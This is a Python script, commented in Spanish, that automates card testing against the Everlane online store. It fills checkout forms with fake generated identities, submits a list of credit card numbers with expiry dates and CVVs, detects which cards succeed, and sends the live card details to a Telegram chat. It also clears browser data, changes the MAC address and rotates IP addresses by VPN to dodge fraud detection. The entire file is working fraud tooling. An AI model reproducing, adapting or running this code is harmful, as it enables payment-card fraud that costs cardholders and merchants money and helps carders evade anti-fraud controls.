### Hecho el 02/08/2008 por SyntaxErr0r ###
import random, argparse
from pg_bot import PyAutoGUI_Bot
from funciones import generar_identidad, telegram, separar_cc, listar_cc

# Variables y Objetos

bot = PyAutoGUI_Bot()
url = 'https://www.everlane.com/products/unisex-diamond-stitch-sock-lavender'

# Funciones

def preparar_worksplace(out_usa):

    if bot.locate('everlane', click=False) == True or bot.locate('payment_method') == True: 
        print('Usando el entorno de trabajo actual')    

    else:
        print('Preparando entorno de trabajo')
        # Necesitamos hacer que abra el Navegador, por defecto: chrome

        bot.press('win')
        bot.pause(0.3)
        bot.write('chrome')
        bot.pause(0.3)
        bot.press('enter')

        # Abrimos Everlane

        bot.pause(0.5)
        bot.press_both('ctrl', 'l')
        bot.copypaste(url)
        bot.pause(0.1)
        bot.press('enter')

        # Esperamos a que la pagina cargue completa
        bot.locate('everlane_icon', check=True, click=False)

        # Ponemos una pausa por si encontramos cualquier popup o descuento
        bot.pause(2)

        if bot.locate('get_early_access', click=False):
            bot.locate('no_thanks') or bot.locate('quit')
        elif bot.locate('get_10_off', click=False):
            bot.locate('no_thanks') or bot.locate('quit')

        bot.locate('sock', check=True, click=False)
        bot.scroll(-250)
        bot.locate('talla_M', wait=0.2)
        bot.locate('agregar_carrito', wait=0.1)
        bot.locate('your_cart', check=True, click=False)
        bot.locate('checkout', wait=1.6)

        # Verificamos si estamos en USA

        if out_usa == True:

            if bot.locate('united_states', wait=3):
                bot.locate('accept')

            else:
                bot.locate('shopping_in', click=False, check=True)
                bot.locate('change_location')
                bot.locate('select_your_location', check=True)
                bot.pause(0.1)
                bot.press('end')
                bot.locate('north_america', wait=0.1)
                bot.press('end')
                bot.locate('united_states', wait=0.1)
                bot.locate('accept', check=True)

            # Lo eliminamos porque estamos probando de otra manera y quiero
            # mantenerlo por si lo llego a necesitar despues

            # if bot.locate('usd', wait=1, click=False):
            #     pass

            # else: 
            #     bot.move(1287, 91, click=True)
            #     bot.locate('select_your_location', check=True)
            #     bot.pause(0.2)
            #     bot.press('end')
            #     bot.locate('north_america', wait=0.1)
            #     bot.press('end')
            #     bot.locate('united_states', wait=0.1)
            #     bot.locate('accept', wait=0.1)

        # Llenamos los datos de forma random y vamos haciendo scroll
        id = generar_identidad()
        
        # bot.locate('paypal', check=True, click=False)
        # Paypal no agarraba o no quiere agarrar
        # Lo quite y puse mejor una pausa de 2 segundos

        bot.pause(3)

        if bot.locate('shopping_in', click=False) == True:
            bot.locate('accept', wait=0.1)

        bot.locate('enter_email', check=True, click=False)
        
        email = bot.get_position('enter_email')
        bot.move(email[0]+151, email[1]+110, click=True)
        bot.press_both('ctrl', 'a')
        bot.copypaste(id[2])
        bot.locate('continue_to_shipping') or bot.press('enter')
        bot.scroll(-200)
        bot.locate('shipping', check=True, click=False)
        bot.locate('full_name')
        print('Nombre')
        bot.pause(0.05)
        bot.write(f"{id[0]} {id[1]}")
        bot.press('tab') # Saltamos la casilla de Full Name
        bot.press('tab') # Saltamos la casilla de Country
        bot.pause(0.05)
        print('Direccion')
        bot.write(str(random.randint(1500,1700)))
        bot.press('tab') # Saltamos la casilla de Street Address
        bot.press('tab') # Saltamos la casilla de Apartment
        bot.press('tab') # Saltamos la casilla de PO Box
        bot.pause(0.03)
        print('Ciudad')
        bot.write('Doral')
        bot.press('tab') # Saltamos la casilla de City
        bot.write('fl')
        bot.pause(0.03)
        print('Estado')
        bot.press('enter')
        bot.press('tab') # Saltamos la casilla de State
        bot.pause(0.03)
        print('Zip Code')
        bot.write('33191')
        bot.press('tab') # Saltamos la casilla de Zip Code
        bot.press('tab') # Saltamos la casilla de Phone Number
        bot.pause(0.03)
        bot.scroll(-300)
        bot.locate('see_shipping_options', check=True, wait=0.2)
        bot.locate('select_shipping_option', check=True, click=False)
        bot.locate('continue_to_payment', wait=0.3) or bot.press('enter')
        bot.pause(0.20)
        bot.scroll(-500)

def livear(cc_namso, current, total, out_usa):

    cc = separar_cc(cc_namso)

    if bot.locate('cc'):
        bot.pause(0.2)
        print(f'CC: {cc[0]}')
        bot.write(cc[0])
        bot.pause(0.2)
        bot.write(cc[1])

        bot.pause(0.2)
        print(f"MMYY: {cc[1]}/{cc[2][2:4]}")
        bot.write(cc[2][2:4])

        bot.pause(0.2)
        print(f"CVC: {cc[3]}")
        bot.write(cc[3])

        bot.pause(0.2)
        bot.locate('credit_card')
        bot.scroll(-500)
        bot.pause(0.4)
        bot.locate('review_order', check=True)

        bot.pause(0.2)
        bot.locate('place_order')

    elif bot.locate('payment_method', click=False) or bot.locate('credit_card', click=False):

        # Si encontramos el boton de editar o cerrar
        bot.locate('edit') or bot.locate('close')
        bot.pause(0.3)

        # Obtenemos la posicion de credit card (Boton Azul)
        # Para poder mover el raton de forma relativa sobre esa posicion
        bot.locate('credit_card', check=True, click=False)
        credit_card = bot.get_position('credit_card')
        
        # Seleccionamos y escribimos la CC
        bot.move(credit_card[0]+100, credit_card[1]+66, click=True)
        bot.pause(0.3)
        bot.press_both('ctrl', 'a')
        bot.pause(0.3)
        print(f'CC: {cc[0]}')
        bot.copypaste(cc[0])

        # Seleccionamos y escribimos el MMYY
        if bot.locate('mmyy',wait=0.2):
            bot.pause(0.3)
        
        else:
            print('Corriendo ELSE MMYY')
            bot.move(credit_card[0]+293, credit_card[1]+66, click=True)
            bot.pause(0.3)
            bot.press_both('ctrl', 'a')
            bot.pause(0.3)

        print(f"MMYY: {cc[1]}/{cc[2][2:4]}")
        bot.copypaste(cc[1])
        bot.copypaste(cc[2][2:4])

        # Seleccionamos el CVC

        if bot.locate('cvv'):
            pass
        else:
            print('Corriendo ELSE CVC')
            bot.move(credit_card[0]+447, credit_card[1]+66, click=True)
            bot.pause(0.3)
            bot.press_both('ctrl', 'a')
            bot.pause(0.3)

        print(f"CVC: {cc[3]}")
        bot.copypaste(cc[3])
        bot.pause(0.3)

        # Hacemos click en credit card seguido de un scroll
        bot.press('enter')
        bot.pause(0.2)
        bot.press('end')
        bot.pause(0.3)
        
        if bot.locate('review_order'):
            pass
        else: 
            bot.locate('review_order', check=True)

        bot.locate('place_order', wait=0.3, check=True)

    print(f"Current: {cc_namso} Number List: {current}")
    
    # Toco hacerle un bucle
    while True:

    
        # Validamos si fue success o failed

        if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
            print(f'CC: {cc} - Live!')
            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\n 📍Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nSuccess", '-726102881')
            bot.press_both('ctrl', 'l')
            bot.copypaste('chrome://settings/clearBrowserData')
            bot.press('enter')
            bot.locate('clear_data')
            bot.pause(0.10)
            bot.press_both('alt', 'f4')

            preparar_worksplace(out_usa)
            break

        # Solo queremos las lives asi que comentamos los telegram de las siguientes condiciones
        
        elif bot.locate('error1', click=False):
            print('There was a problem processing your card. Please call your card issuer or try a different card.')
            # telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
            break


        elif bot.locate('out_funds', click=False):
            print('Your card appears to be out of funds. Please try a new one.')
            # telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
            break

        elif bot.locate('unable_to_add', click=False):
            print("Unable to add payment method. Please try again.")

            # telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')

            bot.press_both('ctrl', 'l')
            bot.copypaste('chrome://settings/clearBrowserData')
            bot.press('enter')
            bot.locate('clear_data', wait=0.2)
            bot.pause(0.10)
            bot.press_both('alt', 'f4')
            bot.pause(0.5)

            # # CAMBIAMOS MAC

            # Para cambiar la mac seleccionar la Ethernet 2
            bot.locate('tmac_logo')
            bot.locate('tmac_random_address')
            bot.locate('tmac_use_02')
            bot.locate('tmac_change_now')
            bot.locate('tmac_mac_changed', check=True, click=False)
            bot.locate('tmac_ok')

            # # CAMBIAMOS IP CON URBAN VPN

            bot.locate('urban_logo', wait=0.3)
            bot.locate('urban_turn_off')
            
            # Temporalmente vamos a desactivar todo lo siguiente
            # Para hacer un input y un cambio de ip manual
            
            # bot.locate('urban_ready_to_connect', check=True, click=False)

            # bot.locate('urban_turn_on', wait=2)

            # vpn = ['luxembourg', 'united_kingdom', 'united_states_urban', 'singapore']

            # bot.locate(random.choice(vpn))
            # bot.locate('urban_connected', check=True, click=False)
            
            input('Cambiar ip y presionar Enter para continuar')

            preparar_worksplace(out_usa)
            break
    
# Logica

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-mode', '-m', type=str)
    args = parser.parse_args()

    out_usa = None

    if args.mode == 'other':
        out_usa = True
        print(out_usa)

    preparar_worksplace(out_usa)

    cc_for_use = listar_cc()

    total = len(cc_for_use)
    current = 1

    for cc in cc_for_use:
        
        livear(cc, current, total, out_usa)
        current += 1
        
if __name__ == '__main__':

    try: 
        main()

    except KeyboardInterrupt:
        exit()

    


